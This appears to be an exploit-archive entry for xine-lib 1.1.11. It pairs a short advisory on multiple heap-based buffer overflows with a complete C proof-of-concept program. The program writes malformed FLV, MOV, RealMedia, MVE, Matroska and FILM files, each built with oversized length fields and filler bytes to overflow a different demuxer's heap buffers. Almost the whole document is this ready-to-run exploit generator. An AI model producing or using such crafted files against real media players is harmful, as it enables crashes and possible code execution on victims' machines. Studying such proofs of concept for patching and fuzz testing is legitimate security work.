source: http://www.securityfocus.com/bid/28370/info

The 'xine-lib' library is prone to multiple heap-based buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied input.

Attackers can exploit these issues to execute arbitrary code in the context of applications that use the library. Failed attacks will cause denial-of-service conditions.

These issues affect xine-lib 1.1.11; other versions may also be affected.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;
typedef int64_t     i64;
typedef uint64_t    u64;



#define VER         "0.1"
#define BUFFSZ      0xffff



#define BE_FOURCC( ch0, ch1, ch2, ch3 )             \
        ( (uint32_t)(unsigned char)(ch3) |          \
        ( (uint32_t)(unsigned char)(ch2) << 8 ) |   \
        ( (uint32_t)(unsigned char)(ch1) << 16 ) |  \
        ( (uint32_t)(unsigned char)(ch0) << 24 ) )
#define FLV_FLAG_HAS_VIDEO       0x01
#define FLV_FLAG_HAS_AUDIO       0x04
#define FLV_TAG_TYPE_SCRIPT      0x12
#define FLV_DATA_TYPE_NUMBER     0x00
#define FLV_DATA_TYPE_OBJECT     0x03
#define FLV_DATA_TYPE_ENDOBJECT  0x09
#define FLV_DATA_TYPE_ARRAY      0x0a
#define MOOV_ATOM BE_FOURCC('m', 'o', 'o', 'v')
#define RMRA_ATOM BE_FOURCC('r', 'm', 'r', 'a')
#define RDRF_ATOM BE_FOURCC('r', 'd', 'r', 'f')
#define RMF_TAG   BE_FOURCC('.', 'R', 'M', 'F')
#define PROP_TAG  BE_FOURCC('P', 'R', 'O', 'P')
#define MDPR_TAG  BE_FOURCC('M', 'D', 'P', 'R')
#define DATA_TAG  BE_FOURCC('D', 'A', 'T', 'A')
#define INDX_TAG  BE_FOURCC('I', 'N', 'D', 'X')
#define VIDO_TAG  BE_FOURCC('V', 'I', 'D', 'O')
#define DATA_CHUNK_HEADER_SIZE 10
#define FORM_TAG BE_FOURCC('F', 'O', 'R', 'M')
#define MOVE_TAG BE_FOURCC('M', 'O', 'V', 'E')
#define PC_TAG   BE_FOURCC('_', 'P', 'C', '_')
#define PALT_TAG BE_FOURCC('P', 'A', 'L', 'T')
#define PALETTE_SIZE 256
#define PALETTE_CHUNK_SIZE (PALETTE_SIZE * 3)
#define EBML_ID_EBML                0x1A45DFA3
#define EBML_ID_DOCTYPE             0x4282
#define GST_EBML_SIZE_UNKNOWN       0x00ffffffffffffffULL
#define GST_EBML_ID_VOID            0xEC
#define FILM_TAG BE_FOURCC('F', 'I', 'L', 'M')
#define STAB_TAG BE_FOURCC('S', 'T', 'A', 'B')



int gst_ebml_write_element_id(u8 *data, u32 id); // from Gstreamer
int gst_ebml_write_element_size(u8 *data, i64 size);  // from Gstreamer
int putcc(u8 *data, int chr, int len);
int putss(u8 *data, u8 *str);
int putxb(u8 *data, u64 num, int bits);
int putxi(u8 *data, u64 num, int bits);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     i,
            attack;
    u8      *buff,
            *fname,
            *psize,
            *p;

    setbuf(stdout, NULL);

    fputs("\n"
        "xine-lib <= 1.1.11 multiple heap overflows "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <output_file>\n"
            "\n"
            "Attacks:\n"
            " 1 = heap overflow in demux_flv (file.FLV)\n"
            " 2 = heap overflow in demux_qt (file.MOV)\n"
            " 3 = heap overflow in demux_real (file.RM)\n"
            " 4 = heap overflow in demux_wc3movie (file.MVE)\n"
            " 5 = heap overflow in ebml.c (file.MKV)\n"
            " 6 = heap overflow in demux_film.c (file.CAK)\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);
    fname = argv[2];

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    p = buff;
    if(attack == 1) {
        p += putss(p, "FLV\x01");
        *p++ = FLV_FLAG_HAS_VIDEO | FLV_FLAG_HAS_AUDIO;
        p += putxb(p, 9,            32);
        p += putxb(p, 0,            32);
        p += putxb(p, FLV_TAG_TYPE_SCRIPT, 8);  // tag_type
        psize = p; p += 3;
        p += putxb(p, 0,            32);        // pts
        p += putxb(p, 0,            24);
        p += putxb(p, FLV_DATA_TYPE_OBJECT, 8);
        p += putxb(p, 13,           16);
        p += putss(p, "filepositions");
        p += putxb(p, FLV_DATA_TYPE_ARRAY, 8);
        p += putxb(p, 0x20000000,   32);
        for(i = 0; i < 4000; i++) {
            p += putxb(p, FLV_DATA_TYPE_NUMBER, 8);
            p += putxb(p, 0x4141414141414141ULL, 64);
        }
        p += putxb(p, FLV_DATA_TYPE_ENDOBJECT, 8);  // useless
        putxb(psize, p - (psize + 3 + 4 + 3),   24);

    } else if(attack == 2) {
        p += putxb(p, 8000 - 24,    32);
        p += putxb(p, MOOV_ATOM,    32);
        p += putxb(p, 8000 - 16,    32);
        p += putxb(p, RMRA_ATOM,    32);
        p += putxb(p, 8000 - 8,     32);
        p += putxb(p, RDRF_ATOM,    32);
        p += putxb(p, 0,            32);    // i + 4
        p += putxb(p, 0,            32);    // i + 8
        p += putxb(p, 0xffffffff,   32);    // i + 12
        p += putcc(p, 'A',          8000 - 12);

    } else if(attack == 3) {
        p += putxb(p, RMF_TAG,      32);
        p += putxb(p, 8,            32);
        p += putxb(p, MDPR_TAG,     32);
        psize = p; p += 4;
        p += putxb(p, 0,            16);
        p += putxb(p, 1,            16);    // mdpr->stream_number
        p += putxb(p, 0,            32);    // mdpr->max_bit_rate
        p += putxb(p, 0,            32);    // mdpr->avg_bit_rate
        p += putxb(p, 0,            32);    // mdpr->max_packet_size
        p += putxb(p, 0,            32);    // mdpr->avg_packet_size
        p += putxb(p, 0,            32);    // mdpr->start_time
        p += putxb(p, 0,            32);    // mdpr->preroll
        p += putxb(p, 0,            32);    // mdpr->duration
        p += putxb(p, 0,            8);     // mdpr->stream_name_size
                                            // mdpr->stream_name
        p += putxb(p, 0,            8);     // 
mdpr->mime_type_size=data[33+mdpr->stream_name_size];
                                            // mdpr->mime_type
        p += putxb(p, 8,            32);    // mdpr->type_specific_len
        p += putxb(p, VIDO_TAG,     32);    // mdpr->type_specific_data
        p += putxb(p, VIDO_TAG,     32);    // mdpr->type_specific_data
        putxb(psize, (p - psize) + 4, 32);
        p += putxb(p, PROP_TAG,     32);
        psize = p; p += 4;
        p += putxb(p, 0,            16);
        p += putxb(p, 0,            32);
        p += putxb(p, 1,            32);    // avg_bitrate
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);    // this->duration
        p += putxb(p, 0,            32);
        p += putxb(p, (p - buff) + 8 + 8 + DATA_CHUNK_HEADER_SIZE, 32); 
// this->index_start
        p += putxb(p, 0,            32);    // this->data_start
        putxb(psize, (p - psize) + 4, 32);
        p += putxb(p, DATA_TAG,     32);
        psize = p; p += 4;
        p += putxb(p, 0,            16);
        p += putxb(p, 0,            32);    // 
this->current_data_chunk_packet_count
        p += putxb(p, 0,            32);    // 
this->next_data_chunk_offset
        p += putxb(p, INDX_TAG,     32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            16);
        p += putxb(p, 0x15555556,   32);    // entries
        p += putxb(p, 1,            16);    // stream_num
        p += putxb(p, 0,            32);    // next_index_chunk
        for(i = 0; i < 4000; i++) {
            p += putxb(p, 0x41414141, 32);
            p += putxb(p, 0x41414141, 32);
            p += putxb(p, 0x41414141, 32);
        }
        putxb(psize, (p - psize) + 4, 32);

    } else if(attack == 4) {
        p += putxb(p, FORM_TAG,     32);
        p += putxb(p, 0,            32);
        p += putxb(p, MOVE_TAG,     32);
        p += putxb(p, PC_TAG,       32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        p += putxi(p, 0x555556,     32);    // this->number_of_shots
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        p += putxb(p, 0,            32);
        for(i = 0; i < 80; i++) {
            p += putxb(p, PALT_TAG, 32);
            p += putxb(p, PALETTE_CHUNK_SIZE, 32);
            p += putcc(p, 13,     PALETTE_CHUNK_SIZE);  // -> 0x48
        }

    } else if(attack == 5) {
        p += gst_ebml_write_element_id(p, EBML_ID_EBML);
        p += gst_ebml_write_element_size(p, 8000);  // not perfect
        p += gst_ebml_write_element_id(p, EBML_ID_DOCTYPE);
        p += gst_ebml_write_element_size(p, 0xffffffff);
        p += putcc(p, 'A',          8000);

    } else if(attack == 6) {
        p += putss(p, "FILM");
        p += 4;
        p += putss(p, "1.09");
        p += putxb(p, 0,            32);
        p += putxb(p, STAB_TAG,     32);
        psize = p; p += 4;
        p += putxb(p, 44100,        32);
        p += putxb(p, 0x71c71c8,    32);    // sizeof(film_sample_t) is 
36 bytes
        for(i = 0; i < 3000; i++) {
            p += putxb(p, 0x41414141, 32);
            p += putxb(p, 0x41414141, 32);
            p += putxb(p, 0x41414141, 32);
            p += putxb(p, 0x41414141, 32);
        }
        putxb(psize, (p - psize) - 40,     32);
        putxb(buff + 4, (p - psize) - 8 - 16, 32);

    } else {
        printf("\nError: wrong attack number (%d)\n", attack);
        exit(1);
    }

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    printf("- write %u bytes\n", p - buff);
    fwrite(buff, 1, p - buff, fd);
    fclose(fd);

    printf("- done\n");
    return(0);
}



int gst_ebml_write_element_id(u8 *data, u32 id) { // from Gstreamer
  int ret, bytes = 4, mask = 0x10;

  while (!(id & (mask << ((bytes - 1) * 8))) && bytes > 0) {
    mask <<= 1;
    bytes--;
  }

  if (bytes == 0) {
    bytes = 1;
    id = GST_EBML_ID_VOID;
  }

  ret = bytes;
  while (bytes--) {
    data[bytes] = id & 0xff;
    id >>= 8;
  }
  return(ret);
}



int gst_ebml_write_element_size(u8 *data, i64 size) {  // from Gstreamer
  int ret, bytes = 1, mask = 0x80;

  if (size != GST_EBML_SIZE_UNKNOWN) {
    while ((size >> ((bytes - 1) * 8)) >= (mask - 1) && bytes <= 8) {
      mask >>= 1;
      bytes++;
    }

    if (bytes > 8) {
      mask = 0x01;
      bytes = 8;
      size = GST_EBML_SIZE_UNKNOWN;
    }
  } else {
    mask = 0x01;
    bytes = 8;
  }

  ret = bytes;
  while (bytes-- > 0) {
    data[bytes] = size & 0xff;
    size >>= 8;
    if (!bytes)
      *data |= mask;
  }
  return(ret);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putss(u8 *data, u8 *str) {
    int     len;

    len = strlen(str);
    memcpy(data, str, len);
    return(len);
}



int putxb(u8 *data, u64 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int putxi(u8 *data, u64 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}